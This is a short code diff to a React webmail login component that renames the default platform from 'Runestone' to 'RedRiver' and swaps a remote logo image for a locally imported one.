@@ -3,7 +3,7 @@ import './home.css';
 
 import { useState } from 'react';
 import axios from 'axios';
-
+import logo from './logo.pl';
 
 
 function Home(){
@@ -11,7 +11,7 @@ function Home(){
     const[email, setEmail] = useState("");
     const[password, setPassword] = useState("");
     const[language, setLanguage] = useState("");
-    const[platform, setPlatform] = useState("Runestone")
+    const[platform, setPlatform] = useState("RedRiver")
 
     const[showError, setShowError] = useState(false);
 
@@ -52,7 +52,7 @@ function Home(){
   </button>
 </div>}
             <div className='imagecontainer'>
-                <h3><img src="https://webmail.runestone.net/scripts/image.pl" alt="WebMail"/></h3>
+                <h3><img src={logo} alt="WebMail"/></h3>
 
             </div>
 
